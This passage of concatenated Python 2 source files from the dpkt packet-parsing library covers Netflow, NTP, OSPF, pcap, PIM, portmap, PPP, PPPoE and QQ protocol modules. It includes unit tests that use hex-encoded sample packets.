x00\x00\x00\x00\xac\x012\xa9\x10\x00\x00\x00\x00\x04\x00\x07\xac\nG\x1f\xac\x01\xfdJ\xc0\xa82\x06\x00\x04\x00\x1b\x00\x00\x00\x01\x00\x00\x00(gz:\x88gz:\x88!\x99i\x87\xac\x1e\x06~\x02\x00\x00\x00\x00\x03\x00\x1b\xac\x01(\xc9\xac\x01B\xc4\xc0\xa82\x02\x00\x03\x00\x19\x00\x00\x00\x01\x00\x00\x00(gz:\x88gz:\x88}6\x00P\xac\x01\x06\xfe\x10\x00\x00\x00\x00\x04\x00\x1b\xac\x0b\x08\xe8\xac\x01F\xe2\xc0\xa82\x02\x00\x04\x00\x19\x00\x00\x00\x01\x00\x00\x05\xdcgz:\x9cgz:\x9c`ii\x87\xac\x01\x06;\x10\x00\x00\x00\x00\x04\x00\x1b\xac\x01\x1d$\xac<\xf0\xc3\xc0\xa82\x06\x00\x03\x00\x1b\x00\x00\x00\x01\x00\x00\x05\xdcgz:\x9cgz:\x9cF2\x00\x14\xac\x01\x06s\x18\x00\x00\x00\x00\x04\x00\x03\xac\x0b\x11Q\xac\x01\xde\x06\xc0\xa82\x06\x00\x04\x00\x1b\x00\x00\x00\x01\x00\x00\x05\xdcgz:\xb0gz:\xb0\xef#\x1a+\xac)\x06\xe9\x10\x00\x00\x00\x00\x04\x00\x1b\xac\x0cR\xd9\xac\x01o\xe8\xc0\xa82\x02\x00\x04\x00\x19\x00\x00\x00\x01\x00\x00\x05\xdcgz:\xc4gz:\xc4\x13n\x00n\xac\x19\x06\xa8\x10\x00\x00\x00\x00\x03\x00\x19\xac\x01=\xdd\xac\x01}\xee\xc0\xa82f\x00\x03\x00\x07\x00\x00\x00\x01\x00\x00\x00(gz:\xc4gz:\xc4\x00\x00\xdc\xbb\xac\x01\x01\xd3\x10\x00\x00\x00\x00\x04\x00\x1b\xac\x0f(\xd1\xac\x01\xcc\xa5\xc0\xa82\x06\x00\x04\x00\x1b\x00\x00\x00\x01\x00\x00\x05\xdcgz:\xd8gz:\xd8\xc5s\x17o\xac\x19\x06#\x18\x00\x00\x00\x00\x03\x00\x07\xac\n\x85[\xc0\xa8cn\n\x00\x02\x01\x00\x04\x00\n\x00\x00\x00\x01\x00\x00\x05\xdcgz:\xe4gz:\xe4\xbfl\x00P\xac\x01\x06\xcf\x10\x00\x00\x00\x00\x04\x00\x07\xac\x010\x1f\xac\x18!E\xc0\xa82f\x00\x03\x00\x07\x00\x00\x00\x01\x00\x00\x05\xdcgz;\x00gz;\x00\x11\x95\x04\xbe\xc0\xa8\x06\xea\x10\x00\x00\x00\x00\x03\x00\n\xac\x010\xb6\xac\x1e\xf4\xaa\xc0\xa82\x06\x00\x03\x00\x1b\x00\x00\x00\x01\x00\x00\x05\xdcgz;4gz;4\x88d\x00\x17\xac\x01\x06\x1f\x10\x00\x00\x00\x00\x04\x00\x1b\xac\x01#_\xac\x1e\xb0\t\xc0\xa82\x06\x00\x03\x00\x1b\x00\x00\x00\x01\x00\x00\x05\xdcgz;Hgz;H\x81S\x00P\xac \x06N\x10\x00\x00\x00\x00\x03\x00\x1b\xac\x01\x04\xd9\xac\x01\x94c\xc0\xa82\x06\x00\x03\x00\x1b\x00\x00\x00\x01\x00\x00\x02(gz;\\gz;\\U\x10\x00P\xac\x01\x06P\x18\x00\x00\x00\x00\x04\x00\x1b\xac\x01<\xae\xac*\xac!\xc0\xa82\x06\x00\x03\x00\x1b\x00\x00\x00\x01\x00\x00\x00\xfagz;\x84gz;\x84\x0c\xe7\x00P\xac\x01\x11\xfd\x10\x00\x00\x00\x00\x04\x00\x1b\xac\x01\x1f\x1f\xac\x17\xedi\xc0\xa82\x02\x00\x03\x00\x19\x00\x00\x00\x01\x00\x00\x05\xdcgz;\x98gz;\x98\xba\x17\x00\x16\xac\x01\x06|\x10\x00\x00\x00\x00\x03\x00\x07"

        def testPack(self):
            pass
    
        def testUnpack(self):
            nf = Netflow1(self.sample_v1)
            assert len(nf.data) == 24
            #print repr(nfv1)

    class NetflowV5TestCase(unittest.TestCase):
        sample_v5 = '\x00\x05\x00\x1d\xb5\xfa\xc9\xd0:\x0bAB&Vw\xde\x9bsv1\x00\x01\x00\x00\xac\n\x86\xa6\xac\x01\xaa\xf7\xc0\xa822\x02q\x00i\x00\x00\x00\x01\x00\x00\x02(\xb5\xfa\x81\x14\xb5\xfa\x81\x1452\x00P\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\xac\x01\x91D\xac\x14C\xe4\xc0\xa82\x16\x00i\x02q\x00\x00\x00\x01\x00\x00\x00(\xb5\xfa\x9b\xbd\xb5\xfa\x9b\xbd\x00P\x85\xd7\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\xac\x17\xe2\xd7\xac\x01\x8cV\xc0\xa822\x02q\x00i\x00\x00\x00\x01\x00\x00\x05\xdc\xb5\xfao\xb8\xb5\xfao\xb8v\xe8\x17o\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\xac\x0e\xf2\xe5\xac\x01\x91\xb2\xc0\xa822\x02q\x00i\x00\x00\x00\x01\x00\x00\x00\xfa\xb5\xfa\x81\xee\xb5\xfa\x81\xee\xd0\xeb\x00\x15\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\xac\nCj\xac)\xa7\t\n\x00\x02\x01\x02q\x00\xdb\x00\x00\x00\x01\x00\x00\x02(\xb5\xfa\x85\x92\xb5\xfa\x85\x92\x8c\xb0\x005\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\xac\x01\x96=\xac\x15\x1a\xa8\xc0\xa82\x16\x00i\x02q\x00\x00\x00\x01\x00\x00\x05\xdc\xb5\xfa\x86\xe0\xb5\xfa\x86\xe0\xb4\xe7\x00\xc2\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\xac\x01V\xd1\xac\x01\x86\x15\xc0\xa822\x02q\x00i\x00\x00\x00\x01\x00\x00\x05\xdc\xb5\xfa}:\xb5\xfa}:[Q\x00P\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\xac2\xf1\xb1\xac)\x19\xca\n\x00\x02\x01\x02q\x00\xdb\x00\x00\x00\x01\x00\x00\x05\xdc\xb5\xfa\x83\xc3\xb5\xfa\x83\xc3\x16,\x00\x15\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\xac\x0cA4\xac\x01\x9az\xc0\xa822\x02q\x00i\x00\x00\x00\x01\x00\x00\x05\xdc\xb5\xfa\x8d\xa7\xb5\xfa\x8d\xa7\x173\x00\x15\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\xac\x1e\xd2\x84\xac)\xd8\xd2\n\x00\x02\x01\x02q\x00\xdb\x00\x00\x00\x01\x00\x00\x05\xdc\xb5\xfa\x8e\x97\xb5\xfa\x8e\x977*\x17o\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\xac\x01\x85J\xac \x11\xfc\xc0\xa82\x16\x00i\x02q\x00\x00\x00\x01\x00\x00\x02(\xb5\xfa\x884\xb5\xfa\x884\xf5\xdd\x00\x8f\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\xac\x01\x04\x80\xac<[n\n\x00\x02\x01\x02q\x00\xdb\x00\x00\x00\x01\x00\x00\x05\xdc\xb5\xfa\x9dr\xb5\xfa\x9drs$\x00\x16\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\xac\x01\xb9J\xac"\xc9\xd7\xc0\xa82\x16\x00i\x02q\x00\x00\x00\x01\x00\x00\x00(\xb5\xfa\x90r\xb5\xfa\x90r\x0f\x8d\x00\xc2\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\xac*\xa3\x10\xac\x01\xb4\x19\xc0\xa822\x02q\x00i\x00\x00\x00\x01\x00\x00\x00(\xb5\xfa\x92\x03\xb5\xfa\x92\x03pf\x00\x15\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\xac\x01\xabo\xac\x1e\x7fi\xc0\xa82\x16\x00i\x02q\x00\x00\x00\x01\x00\x00\x05\xdc\xb5\xfa\x93\x7f\xb5\xfa\x93\x7f\x00P\x0b\x98\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\xac\x0c\n\xea\xac\x01\xa1\x15\xc0\xa822\x02q\x00i\x00\x00\x00\x01\x00\x00\x05\xdc\xb5\xfay\xcf\xb5\xfay\xcf[3\x17\xe0\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\xac\x01\xbb\xb3\xac)u\x8c\n\x00\x02\x01\x00i\x00\xdb\x00\x00\x00\x01\x00\x00\x00\xfa\xb5\xfa\x943\xb5\xfa\x943\x00P\x1e\xca\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\xac\x0fJ`\xac\x01\xab\x94\xc0\xa822\x02q\x00i\x00\x00\x00\x01\x00\x00\x02(\xb5\xfa\x87[\xb5\xfa\x87[\x9a\xd6/\xab\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\xac*\x0f\x93\xac\x01\xb8\xa3\xc0\xa822\x02q\x00i\x00\x00\x00\x01\x00\x00\x00(\xb5\xfa\x89\xbb\xb5\xfa\x89\xbbn\xe1\x00P\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\xac\x01\x93\xa1\xac\x16\x80\x0c\xc0\xa82\x16\x00i\x02q\x00\x00\x00\x01\x00\x00\x00(\xb5\xfa\x87&\xb5\xfa\x87&\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\xac\x01\x83Z\xac\x1fR\xcd\xc0\xa82\x16\x00i\x02q\x00\x00\x00\x01\x00\x00\x05\xdc\xb5\xfa\x90\r\xb5\xfa\x90\r\xf7*\x00\x8a\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\xac\x0c\xe0\xad\xac\x01\xa8V\xc0\xa822\x02q\x00i\x00\x00\x00\x01\x00\x00\x05\xdc\xb5\xfa\x9c\xf6\xb5\xfa\x9c\xf6\xe5|\x1a+\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\xac\x1e\xccT\xac<x&\n\x00\x02\x01\x02q\x00\xdb\x00\x00\x00\x01\x00\x00\x05\xdc\xb5\xfa\x80\xea\xb5\xfa\x80\xea\x00\x00\x00\x00\x00\x00/\x00\x00\x00\x00\x00\x00\x00\x00\x00\xac\x01\xbb\x18\xac\x01|z\xc0\xa82\x16\x00i\x02q\x00\x00\x00\x01\x00\x00\x00\xfa\xb5\xfa\x88p\xb5\xfa\x88p\x00P\x0b}\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\xac\x17\x0er\xac\x01\x8f\xdd\xc0\xa822\x02q\x00i\x00\x00\x00\x01\x00\x00\x02(\xb5\xfa\x89\xf7\xb5\xfa\x89\xf7\r\xf7\x00\x8a\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\xac\n\xbb\x04\xac<\xb0\x15\n\x00\x02\x01\x02q\x00\xdb\x00\x00\x00\x01\x00\x00\x05\xdc\xb5\xfa\x90\xa9\xb5\xfa\x90\xa9\x9c\xd0\x00\x8f\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\xac\nz?\xac)\x03\xc8\n\x00\x02\x01\x02q\x00\xdb\x00\x00\x00\x01\x00\x00\x05\xdc\xb5\xfaue\xb5\xfaue\xee\xa6\x00P\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\xac\x01\xb5\x05\xc0\xa8c\x9f\n\x00\x02\x01\x00i\x00\xdb\x00\x00\x00\x01\x00\x00\x05\xdc\xb5\xfa{\xc7\xb5\xfa{\xc7\x00P\x86\xa9\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\xac2\xa5\x1b\xac)0\xbf\n\x00\x02\x01\x02q\x00\xdb\x00\x00\x00\x01\x00\x00\x00\xfa\xb5\xfa\x9bZ\xb5\xfa\x9bZC\xf9\x17\xe0\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00'

        def testPack(self):
            pass

        def testUnpack(self):
            nf = Netflow5(self.sample_v5)
            assert len(nf.data) == 29
            #print repr(nfv5)

    unittest.main()

    

########NEW FILE########
__FILENAME__ = ntp
# $Id: ntp.py 48 2008-05-27 17:31:15Z yardley $

"""Network Time Protocol."""

import dpkt

# NTP v4

# Leap Indicator (LI) Codes
NO_WARNING		= 0
LAST_MINUTE_61_SECONDS	= 1
LAST_MINUTE_59_SECONDS	= 2
ALARM_CONDITION		= 3

# Mode Codes
RESERVED		= 0
SYMMETRIC_ACTIVE	= 1
SYMMETRIC_PASSIVE	= 2
CLIENT			= 3
SERVER			= 4
BROADCAST		= 5
CONTROL_MESSAGE		= 6
PRIVATE			= 7

class NTP(dpkt.Packet):
    __hdr__ = (
        ('flags', 'B', 0),
        ('stratum', 'B', 0),
        ('interval', 'B', 0),
        ('precision', 'B', 0),
        ('delay', 'I', 0),
        ('dispersion', 'I', 0),
        ('id', '4s', 0),
        ('update_time', '8s', 0),
        ('originate_time', '8s', 0),
        ('receive_time', '8s', 0),
        ('transmit_time', '8s', 0)
        )

    def _get_v(self):
        return (self.flags >> 3) & 0x7
    def _set_v(self, v):
        self.flags = (self.flags & ~0x38) | ((v & 0x7) << 3)
    v = property(_get_v, _set_v)

    def _get_li(self):
        return (self.flags >> 6) & 0x3
    def _set_li(self, li):
        self.flags = (self.flags & ~0xc0) | ((li & 0x3) << 6)
    li = property(_get_li, _set_li)
    
    def _get_mode(self):
        return (self.flags & 0x7)
    def _set_mode(self, mode):
        self.flags = (self.flags & ~0x7) | (mode & 0x7)
    mode = property(_get_mode, _set_mode)

if __name__ == '__main__':
    import unittest

    class NTPTestCase(unittest.TestCase):
        def testPack(self):
            n = NTP(self.s)
            self.failUnless(self.s == str(n))

        def testUnpack(self):
            n = NTP(self.s)
            self.failUnless(n.li == NO_WARNING)
            self.failUnless(n.v == 4)
            self.failUnless(n.mode == SERVER)
            self.failUnless(n.stratum == 2)
            self.failUnless(n.id == '\xc1\x02\x04\x02')

            # test get/set functions
            n.li = ALARM_CONDITION
            n.v = 3
            n.mode = CLIENT
            self.failUnless(n.li == ALARM_CONDITION)
            self.failUnless(n.v == 3)
            self.failUnless(n.mode == CLIENT)

        s = '\x24\x02\x04\xef\x00\x00\x00\x84\x00\x00\x33\x27\xc1\x02\x04\x02\xc8\x90\xec\x11\x22\xae\x07\xe5\xc8\x90\xf9\xd9\xc0\x7e\x8c\xcd\xc8\x90\xf9\xd9\xda\xc5\xb0\x78\xc8\x90\xf9\xd9\xda\xc6\x8a\x93'
    unittest.main()

########NEW FILE########
__FILENAME__ = ospf
# $Id: ospf.py 23 2006-11-08 15:45:33Z dugsong $

"""Open Shortest Path First."""

import dpkt

AUTH_NONE = 0
AUTH_PASSWORD = 1
AUTH_CRYPTO = 2

class OSPF(dpkt.Packet):
    __hdr__ = (
        ('v', 'B', 0),
        ('type', 'B', 0),
        ('len', 'H', 0),
        ('router', 'I', 0),
        ('area', 'I', 0),
        ('sum', 'H', 0),
        ('atype', 'H', 0),
        ('auth', '8s', '')
        )
    def __str__(self):
        if not self.sum:
            self.sum = dpkt.in_cksum(dpkt.Packet.__str__(self))
        return dpkt.Packet.__str__(self)

########NEW FILE########
__FILENAME__ = pcap
# $Id: pcap.py 56 2009-11-06 22:28:26Z jon.oberheide $

"""Libpcap file format."""

import sys, time
import dpkt

TCPDUMP_MAGIC = 0xa1b2c3d4L
PMUDPCT_MAGIC = 0xd4c3b2a1L

PCAP_VERSION_MAJOR = 2
PCAP_VERSION_MINOR = 4

DLT_NULL               = 0
DLT_EN10MB             = 1
DLT_EN3MB              = 2
DLT_AX25               = 3
DLT_PRONET             = 4
DLT_CHAOS              = 5
DLT_IEEE802            = 6
DLT_ARCNET             = 7
DLT_SLIP               = 8
DLT_PPP                = 9
DLT_FDDI               = 10
DLT_PFSYNC             = 18
DLT_IEEE802_11         = 105
DLT_LINUX_SLL          = 113
DLT_PFLOG              = 117
DLT_IEEE802_11_RADIO   = 127

if sys.platform.find('openbsd') != -1:
    DLT_LOOP           = 12
    DLT_RAW            = 14
else:
    DLT_LOOP           = 108
    DLT_RAW            = 12

dltoff = { DLT_NULL:4, DLT_EN10MB:14, DLT_IEEE802:22, DLT_ARCNET:6,
           DLT_SLIP:16, DLT_PPP:4, DLT_FDDI:21, DLT_PFLOG:48, DLT_PFSYNC:4,
           DLT_LOOP:4, DLT_LINUX_SLL:16 }

class PktHdr(dpkt.Packet):
    """pcap packet header."""
    __hdr__ = (
        ('tv_sec', 'I', 0),
        ('tv_usec', 'I', 0),
        ('caplen', 'I', 0),
        ('len', 'I', 0),
        )

class LEPktHdr(PktHdr):
    __byte_order__ = '<'

class FileHdr(dpkt.Packet):
    """pcap file header."""
    __hdr__ = (
        ('magic', 'I', TCPDUMP_MAGIC),
        ('v_major', 'H', PCAP_VERSION_MAJOR),
        ('v_minor', 'H', PCAP_VERSION_MINOR),
        ('thiszone', 'I', 0),
        ('sigfigs', 'I', 0),
        ('snaplen', 'I', 1500),
        ('linktype', 'I', 1),
        )

class LEFileHdr(FileHdr):
    __byte_order__ = '<'

class Writer(object):
    """Simple pcap dumpfile writer."""
    def __init__(self, fileobj, snaplen=1500, linktype=DLT_EN10MB):
        self.__f = fileobj
        fh = FileHdr(snaplen=snaplen, linktype=linktype)
        self.__f.write(str(fh))

    def writepkt(self, pkt, ts=None):
        if ts is None:
            ts = time.time()
        s = str(pkt)
        n = len(s)
        ph = PktHdr(tv_sec=int(ts),
                    tv_usec=int((float(ts) - int(ts)) * 1000000.0),
                    caplen=n, len=n)
        self.__f.write(str(ph))
        self.__f.write(s)

    def close(self):
        self.__f.close()

class Reader(object):
    """Simple pypcap-compatible pcap file reader."""
    
    def __init__(self, fileobj):
        self.name = fileobj.name
        self.fd = fileobj.fileno()
        self.__f = fileobj
        buf = self.__f.read(FileHdr.__hdr_len__)
        self.__fh = FileHdr(buf)
        self.__ph = PktHdr
        if self.__fh.magic == PMUDPCT_MAGIC:
            self.__fh = LEFileHdr(buf)
            self.__ph = LEPktHdr
        elif self.__fh.magic != TCPDUMP_MAGIC:
            raise ValueError, 'invalid tcpdump header'
        if self.__fh.linktype in dltoff:
            self.dloff = dltoff[self.__fh.linktype]
        else:
            self.dloff = 0
        self.snaplen = self.__fh.snaplen
        self.filter = ''

    def fileno(self):
        return self.fd
    
    def datalink(self):
        return self.__fh.linktype
    
    def setfilter(self, value, optimize=1):
        return NotImplementedError

    def readpkts(self):
        return list(self)
    
    def dispatch(self, cnt, callback, *args):
        if cnt > 0:
            for i in range(cnt):
                ts, pkt = self.next()
                callback(ts, pkt, *args)
        else:
            for ts, pkt in self:
                callback(ts, pkt, *args)

    def loop(self, callback, *args):
        self.dispatch(0, callback, *args)
    
    def __iter__(self):
        self.__f.seek(FileHdr.__hdr_len__)
        while 1:
            buf = self.__f.read(PktHdr.__hdr_len__)
            if not buf: break
            hdr = self.__ph(buf)
            buf = self.__f.read(hdr.caplen)
            yield (hdr.tv_sec + (hdr.tv_usec / 1000000.0), buf)

if __name__ == '__main__':
    import unittest

    class PcapTestCase(unittest.TestCase):
        def test_endian(self):
            be = '\xa1\xb2\xc3\xd4\x00\x02\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x60\x00\x00\x00\x01'
            le = '\xd4\xc3\xb2\xa1\x02\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x60\x00\x00\x00\x01\x00\x00\x00'
            befh = FileHdr(be)
            lefh = LEFileHdr(le)
            self.failUnless(befh.linktype == lefh.linktype)

    unittest.main()

########NEW FILE########
__FILENAME__ = pim
# $Id: pim.py 23 2006-11-08 15:45:33Z dugsong $

"""Protocol Independent Multicast."""

import dpkt

class PIM(dpkt.Packet):
    __hdr__ = (
        ('v_type', 'B', 0x20),
        ('rsvd', 'B', 0),
        ('sum', 'H', 0)
        )
    def _get_v(self): return self.v_type >> 4
    def _set_v(self, v): self.v_type = (v << 4) | (self.v_type & 0xf)
    v = property(_get_v, _set_v)
    
    def _get_type(self): return self.v_type & 0xf
    def _set_type(self, type): self.v_type = (self.v_type & 0xf0) | type
    type = property(_get_type, _set_type)

    def __str__(self):
        if not self.sum:
            self.sum = dpkt.in_cksum(dpkt.Packet.__str__(self))
        return dpkt.Packet.__str__(self)

########NEW FILE########
__FILENAME__ = pmap
# $Id: pmap.py 23 2006-11-08 15:45:33Z dugsong $

"""Portmap / rpcbind."""

import dpkt

PMAP_PROG = 100000L
PMAP_PROCDUMP = 4
PMAP_VERS = 2

class Pmap(dpkt.Packet):
    __hdr__ = (
        ('prog', 'I', 0),
        ('vers', 'I', 0),
        ('prot', 'I', 0),
        ('port', 'I', 0),
        )

########NEW FILE########
__FILENAME__ = ppp
# $Id: ppp.py 65 2010-03-26 02:53:51Z dugsong $

"""Point-to-Point Protocol."""

import struct
import dpkt

# XXX - finish later

# http://www.iana.org/assignments/ppp-numbers
PPP_IP	= 0x21		# Internet Protocol
PPP_IP6 = 0x57		# Internet Protocol v6

# Protocol field compression
PFC_BIT	= 0x01

class PPP(dpkt.Packet):
    __hdr__ = (
        ('p', 'B', PPP_IP),
        )
    _protosw = {}
    
    def set_p(cls, p, pktclass):
        cls._protosw[p] = pktclass
    set_p = classmethod(set_p)

    def get_p(cls, p):
        return cls._protosw[p]
    get_p = classmethod(get_p)
    
    def unpack(self, buf):
        dpkt.Packet.unpack(self, buf)
        if self.p & PFC_BIT == 0:
            self.p = struct.unpack('>H', buf[:2])[0]
            self.data = self.data[1:]
        try:
            self.data = self._protosw[self.p](self.data)
            setattr(self, self.data.__class__.__name__.lower(), self.data)
        except (KeyError, struct.error, dpkt.UnpackError):
            pass

    def pack_hdr(self):
        try:
            if self.p > 0xff:
                return struct.pack('>H', self.p)
            return dpkt.Packet.pack_hdr(self)
        except struct.error, e:
            raise dpkt.PackError(str(e))

def __load_protos():
    g = globals()
    for k, v in g.iteritems():
        if k.startswith('PPP_'):
            name = k[4:]
            modname = name.lower()
            try:
                mod = __import__(modname, g)
            except ImportError:
                continue
            PPP.set_p(v, getattr(mod, name))

if not PPP._protosw:
    __load_protos()

########NEW FILE########
__FILENAME__ = pppoe
# $Id: pppoe.py 23 2006-11-08 15:45:33Z dugsong $

"""PPP-over-Ethernet."""

import dpkt, ppp

# RFC 2516 codes
PPPoE_PADI	= 0x09
PPPoE_PADO	= 0x07
PPPoE_PADR	= 0x19
PPPoE_PADS	= 0x65
PPPoE_PADT	= 0xA7
PPPoE_SESSION	= 0x00

class PPPoE(dpkt.Packet):
    __hdr__ = (
        ('v_type', 'B', 0x11),
        ('code', 'B', 0),
        ('session', 'H', 0),
        ('len', 'H', 0)		# payload length
        )
    def _get_v(self): return self.v_type >> 4
    def _set_v(self, v): self.v_type = (v << 4) | (self.v_type & 0xf)
    v = property(_get_v, _set_v)

    def _get_type(self): return self.v_type & 0xf
    def _set_type(self, t): self.v_type = (self.v_type & 0xf0) | t
    type = property(_get_type, _set_type)

    def unpack(self, buf):
        dpkt.Packet.unpack(self, buf)
        try:
            if self.code == 0:
                self.data = self.ppp = ppp.PPP(self.data)
        except dpkt.UnpackError:
            pass
        
# XXX - TODO TLVs, etc.

########NEW FILE########
__FILENAME__ = qq
# $Id: qq.py 48 2008-05-27 17:31:15Z yardley $

from dpkt import Packet

# header_type
QQ_HEADER_BASIC_FAMILY = 0x02
QQ_HEADER_P2P_FAMILY = 0x00
QQ_HEADER_03_FAMILY = 0x03
QQ_HEADER_04_FAMILY = 0x04
QQ_HEADER_05_FAMILY = 0x05

header_type_str = [
    "QQ_HEADER_P2P_FAMILY",
    "Unknown Type",
    "QQ_HEADER_03_FAMILY",
    "QQ_HEADER_04_FAMILY",
    "QQ_HEADER_05_FAMILY",
]

# command
QQ_CMD_LOGOUT = 0x0001
QQ_CMD_KEEP_ALIVE = 0x0002
QQ_CMD_MODIFY_INFO = 0x0004
QQ_CMD_SEARCH_USER = 0x0005
QQ_CMD_GET_USER_INFO = 0x0006
QQ_CMD_ADD_FRIEND = 0x0009
QQ_CMD_DELETE_FRIEND = 0x000A
QQ_CMD_ADD_FRIEND_AUTH = 0x000B
QQ_CMD_CHANGE_STATUS = 0x000D
QQ_CMD_ACK_SYS_MSG = 0x0012
QQ_CMD_SEND_IM = 0x0016
QQ_CMD_RECV_IM = 0x0017
QQ_CMD_REMOVE_SELF = 0x001C
QQ_CMD_REQUEST_KEY = 0x001D
QQ_CMD_LOGIN = 0x0022
QQ_CMD_GET_FRIEND_LIST = 0x0026
QQ_CMD_GET_ONLINE_OP = 0x0027
QQ_CMD_SEND_SMS = 0x002D
QQ_CMD_CLUSTER_CMD = 0x0030
QQ_CMD_TEST = 0x0031
QQ_CMD_GROUP_DATA_OP = 0x003C
QQ_CMD_UPLOAD_GROUP_FRIEND = 0x003D
QQ_CMD_FRIEND_DATA_OP = 0x003E
QQ_CMD_DOWNLOAD_GROUP_FRIEND = 0x0058
QQ_CMD_FRIEND_LEVEL_OP = 0x005C 
QQ_CMD_PRIVACY_DATA_OP = 0x005E
QQ_CMD_CLUSTER_DATA_OP = 0x005F
QQ_CMD_ADVANCED_SEARCH = 0x0061
QQ_CMD_REQUEST_LOGIN_TOKEN = 0x0062
QQ_CMD_USER_PROPERTY_OP = 0x0065
QQ_CMD_TEMP_SESSION_OP = 0x0066
QQ_CMD_SIGNATURE_OP = 0x0067
QQ_CMD_RECV_MSG_SYS = 0x0080
QQ_CMD_RECV_MSG_FRIEND_CHANGE_STATUS = 0x0081
QQ_CMD_WEATHER_OP = 0x00A6
QQ_CMD_ADD_FRIEND_EX = 0x00A7
QQ_CMD_AUTHORIZE = 0X00A8
QQ_CMD_UNKNOWN = 0xFFFF
QQ_SUB_CMD_SEARCH_ME_BY_QQ_ONLY = 0x03
QQ_SUB_CMD_SHARE_GEOGRAPHY = 0x04
QQ_SUB_CMD_GET_FRIEND_LEVEL = 0x02
QQ_SUB_CMD_GET_CLUSTER_ONLINE_MEMBER = 0x01 
QQ_05_CMD_REQUEST_AGENT = 0x0021
QQ_05_CMD_REQUEST_FACE = 0x0022
QQ_05_CMD_TRANSFER = 0x0023
QQ_05_CMD_REQUEST_BEGIN = 0x0026
QQ_CLUSTER_CMD_CREATE_CLUSTER= 0x01
QQ_CLUSTER_CMD_MODIFY_MEMBER= 0x02
QQ_CLUSTER_CMD_MODIFY_CLUSTER_INFO= 0x03
QQ_CLUSTER_CMD_GET_CLUSTER_INFO= 0x04
QQ_CLUSTER_CMD_ACTIVATE_CLUSTER= 0x05
QQ_CLUSTER_CMD_SEARCH_CLUSTER= 0x06
QQ_CLUSTER_CMD_JOIN_CLUSTER= 0x07
QQ_CLUSTER_CMD_JOIN_CLUSTER_AUTH= 0x08
QQ_CLUSTER_CMD_EXIT_CLUSTER= 0x09
QQ_CLUSTER_CMD_SEND_IM= 0x0A
QQ_CLUSTER_CMD_GET_ONLINE_MEMBER= 0x0B
QQ_CLUSTER_CMD_GET_MEMBER_INFO= 0x0C
QQ_CLUSTER_CMD_MODIFY_CARD = 0x0E
QQ_CLUSTER_CMD_GET_CARD_BATCH= 0x0F
QQ_CLUSTER_CMD_GET_CARD = 0x10
QQ_CLUSTER_CMD_COMMIT_ORGANIZATION = 0x11
QQ_CLUSTER_CMD_UPDATE_ORGANIZATION= 0x12
QQ_CLUSTER_CMD_COMMIT_MEMBER_ORGANIZATION = 0x13
QQ_CLUSTER_CMD_GET_VERSION_ID= 0x19
QQ_CLUSTER_CMD_SEND_IM_EX = 0x1A
QQ_CLUSTER_CMD_SET_ROLE = 0x1B
QQ_CLUSTER_CMD_TRANSFER_ROLE = 0x1C
QQ_CLUSTER_CMD_CREATE_TEMP = 0x30
QQ_CLUSTER_CMD_MODIFY_TEMP_MEMBER = 0x31
QQ_CLUSTER_CMD_EXIT_TEMP = 0x32
QQ_CLUSTER_CMD_GET_TEMP_INFO = 0x33
QQ_CLUSTER_CMD_MODIFY_TEMP_INFO = 0x34
QQ_CLUSTER_CMD_SEND_TEMP_IM = 0x35
QQ_CLUSTER_CMD_SUB_CLUSTER_OP = 0x36
QQ_CLUSTER_CMD_ACTIVATE_TEMP = 0x37

QQ_CLUSTER_SUB_CMD_ADD_MEMBER = 0x01
QQ_CLUSTER_SUB_CMD_REMOVE_MEMBER = 0x02
QQ_CLUSTER_SUB_CMD_GET_SUBJECT_LIST = 0x02
QQ_CLUSTER_SUB_CMD_GET_DIALOG_LIST = 0x01

QQ_SUB_CMD_GET_ONLINE_FRIEND = 0x2
QQ_SUB_CMD_GET_ONLINE_SERVICE = 0x3
QQ_SUB_CMD_UPLOAD_GROUP_NAME = 0x2
QQ_SUB_CMD_DOWNLOAD_GROUP_NAME = 0x1
QQ_SUB_CMD_SEND_TEMP_SESSION_IM = 0x01
QQ_SUB_CMD_BATCH_DOWNLOAD_FRIEND_REMARK = 0x0
QQ_SUB_CMD_UPLOAD_FRIEND_REMARK = 0x1
QQ_SUB_CMD_REMOVE_FRIEND_FROM_LIST = 0x2
QQ_SUB_CMD_DOWNLOAD_FRIEND_REMARK = 0x3
QQ_SUB_CMD_MODIFY_SIGNATURE = 0x01
QQ_SUB_CMD_DELETE_SIGNATURE = 0x02
QQ_SUB_CMD_GET_SIGNATURE = 0x03
QQ_SUB_CMD_GET_USER_PROPERTY = 0x01
QQ_SUB_CMD_GET_WEATHER = 0x01

QQ_FILE_CMD_HEART_BEAT = 0x0001
QQ_FILE_CMD_HEART_BEAT_ACK = 0x0002
